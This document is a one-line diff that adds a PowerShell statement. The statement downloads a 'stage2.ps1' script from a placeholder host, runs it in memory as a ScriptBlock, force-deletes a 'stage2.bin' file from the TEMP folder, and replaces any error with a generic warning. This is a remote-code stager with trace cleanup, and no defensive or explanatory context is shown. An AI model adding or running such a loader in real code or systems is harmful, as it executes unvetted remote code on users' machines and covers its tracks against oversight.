@@ -1,0 +1,1 @@
+try { $RemoteScript = (iwr 'https://contoso.com/stage2.ps1' -UseBasicParsing).Content; [ScriptBlock]::Create($RemoteScript).Invoke(); Set-Location -Path $env:TEMP; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Stage transfer failed" }
